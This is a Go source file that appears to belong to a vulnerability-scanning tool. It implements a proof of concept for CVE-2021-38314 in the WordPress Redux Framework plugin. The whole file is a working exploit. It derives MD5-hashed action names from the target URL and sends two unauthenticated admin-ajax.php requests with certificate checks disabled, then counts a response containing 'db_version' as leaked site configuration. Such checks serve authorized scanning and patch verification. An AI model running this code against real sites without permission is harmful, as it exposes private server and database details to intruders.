package poc

import (
	"crypto/md5"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func (Info *PocInfo) CVE_2021_38314_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CVE-2021-38314"
	poc.Info.Target = "wordpress"
	poc.Info.Type = "INFO"
	poc.Info.Name = "WordPress Redux Framework Config INFO"
	poc.Info.Level = 2
	poc.Info.Author = "youzai"

	poc.Poc.Proto = "http"

	poc.Config.Customize = true // 设置为自定义poc
	poc.Config.Url = PocCustomize.Config.Url
	poc.Config.Timeout = PocCustomize.Config.Timeout
	poc.Config.User_Agent = PocCustomize.Config.User_Agent
	poc.Config.Proxy = PocCustomize.Config.Proxy
	poc.Config.Proxy_Url = PocCustomize.Config.Proxy_Url

	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},           // 取消证书认证
		ResponseHeaderTimeout: time.Second * time.Duration(poc.Config.Timeout), // 设置超时时间
	}

	// 检查是否使用代理
	if poc.Config.Proxy && poc.Config.Proxy_Url != "" {
		urli := url.URL{}
		urlProxy, _ := urli.Parse(poc.Config.Proxy_Url)
		transport.Proxy = http.ProxyURL(urlProxy) // 设置代理
	}

	// 生成http客户端
	cli := &http.Client{
		Transport: transport,
	}

	// 编写自定义检测函数
	poc.Config.Check = func() bool {
		url1 := poc.Config.Url + "/-redux"
		has1 := md5.Sum([]byte(url1))
		md5Str1 := fmt.Sprintf("%x", has1)
		request1, err := http.NewRequest("GET", poc.Config.Url+"/wp-admin/admin-ajax.php?action="+md5Str1, nil)
		if err != nil {
			return false
		}

		request1.Header.Add("User-Agent", poc.Config.User_Agent)
		response1, err := cli.Do(request1)
		if err != nil {
			return false
		}
		defer response1.Body.Close()

		body, _ := ioutil.ReadAll(response1.Body)
		key := string(body) + "-support"
		has2 := md5.Sum([]byte(key))
		md5Str2 := fmt.Sprintf("%x", has2)
		request2, err := http.NewRequest("GET", poc.Config.Url+"/wp-admin/admin-ajax.php?action="+md5Str2, nil)
		if err != nil {
			return false
		}

		request2.Header.Add("User-Agent", poc.Config.User_Agent)
		if response2, err := cli.Do(request2); err != nil {
			return false
		} else {
			body, _ := ioutil.ReadAll(response2.Body)
			if strings.Contains(string(body), "db_version") {
				return true
			}
		}
		return false
	}
	PocStruct = append(PocStruct, poc)
}
